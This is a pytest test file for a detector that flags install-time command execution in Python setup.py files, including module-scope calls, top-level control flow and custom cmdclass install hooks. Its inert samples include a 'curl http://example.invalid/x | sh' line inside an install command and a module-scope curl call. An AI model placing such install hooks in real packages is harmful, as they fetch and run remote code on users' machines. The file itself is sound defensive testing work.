"""Supply-chain Python detector: install-time exec in setup.py.

Samples are inert — the network target is an RFC-reserved non-resolving host (`example.invalid`)
and nothing is installed; they exist only to give the detector a module-scope call to match."""

import pytest
from _support import rule_ids, run_audit

_SUBPROCESS = (
    "import subprocess\n"
    'subprocess.check_call(["curl", "http://example.invalid/x"])\n'
    'from setuptools import setup\nsetup(name="x")\n'
)
_OS_SYSTEM = 'import os\nos.system("echo building")\nfrom setuptools import setup\nsetup(name="x")\n'
_CLEAN = (
    'from setuptools import setup\n\nsetup(name="x", version="1.0", packages=["x"])\n'
)


@pytest.mark.parametrize(
    "src", [_SUBPROCESS, _OS_SYSTEM], ids=["subprocess", "os.system"]
)
def test_flags_setup_py_install_exec(src):
    assert "PY-SUPPLY-SETUP-EXEC" in rule_ids(run_audit(src, rel_path="setup.py"))


def test_clean_setup_py_is_quiet():
    assert "PY-SUPPLY-SETUP-EXEC" not in rule_ids(
        run_audit(_CLEAN, rel_path="setup.py")
    )


def test_only_fires_for_setup_py():
    # the identical code in a regular module is not an install-time hook (it isn't pip-executed)
    assert "PY-SUPPLY-SETUP-EXEC" not in rule_ids(
        run_audit(_SUBPROCESS, rel_path="app/build_helper.py")
    )


def test_exec_inside_a_function_is_not_module_scope():
    # a helper that's defined but only called by the build backend doesn't run at install time
    src = (
        "import subprocess\n"
        "def build():\n"
        '    subprocess.check_call(["make"])\n'
        'from setuptools import setup\nsetup(name="x")\n'
    )
    assert "PY-SUPPLY-SETUP-EXEC" not in rule_ids(run_audit(src, rel_path="setup.py"))


# top-level compound statements that DO execute when pip builds the sdist — each must flag
_RUNS_ON_INSTALL = {
    "if-__main__": 'import os\nif __name__ == "__main__":\n    os.system("x")\n',
    "top-level-try": 'import os\ntry:\n    os.system("x")\nexcept OSError:\n    pass\n',
    "top-level-for": "import os\nfor h in hosts:\n    os.system(h)\n",
}


@pytest.mark.parametrize(
    "src", list(_RUNS_ON_INSTALL.values()), ids=list(_RUNS_ON_INSTALL)
)
def test_exec_in_top_level_control_flow_is_install_time(src):
    assert "PY-SUPPLY-SETUP-EXEC" in rule_ids(run_audit(src, rel_path="setup.py"))


def test_empty_setup_py_is_clean():
    assert "PY-SUPPLY-SETUP-EXEC" not in rule_ids(run_audit("", rel_path="setup.py"))


def test_generic_callees_do_not_false_positive():
    # `run`/`get`/`call` are deliberately excluded — a config read at module scope isn't exec
    src = 'import config\nDATA = config.get("x")\nrunner.run()\nfrom setuptools import setup\nsetup(name="x")\n'
    assert "PY-SUPPLY-SETUP-EXEC" not in rule_ids(run_audit(src, rel_path="setup.py"))


def test_flags_exec_inside_a_cmdclass_command():
    # a custom install command that shells out — the cmdclass hook runs on `pip install`, hidden
    # in a class the module-scope pass skips
    src = (
        "import os\n"
        "from setuptools.command.install import install\n"
        "class CustomInstall(install):\n"
        "    def run(self):\n"
        '        os.system("curl http://example.invalid/x | sh")\n'
        "        install.run(self)\n"
        "from setuptools import setup\n"
        'setup(cmdclass={"install": CustomInstall})\n'
    )
    assert "PY-SUPPLY-SETUP-EXEC" in rule_ids(run_audit(src, rel_path="setup.py"))


def test_clean_command_class_is_quiet():
    # a custom build command that only calls super().run() is not install-time exec
    src = (
        "from setuptools.command.build_ext import build_ext\n"
        "class BuildExt(build_ext):\n"
        "    def run(self):\n"
        "        super().run()\n"
        "from setuptools import setup\n"
        'setup(cmdclass={"build_ext": BuildExt})\n'
    )
    assert "PY-SUPPLY-SETUP-EXEC" not in rule_ids(run_audit(src, rel_path="setup.py"))


def test_ordinary_class_in_setup_py_is_not_a_command():
    # a plain helper class (not a setuptools Command subclass) isn't an install hook
    src = (
        "import os\n"
        "class Helper:\n"
        "    def go(self):\n"
        '        os.system("x")\n'
        'from setuptools import setup\nsetup(name="x")\n'
    )
    assert "PY-SUPPLY-SETUP-EXEC" not in rule_ids(run_audit(src, rel_path="setup.py"))
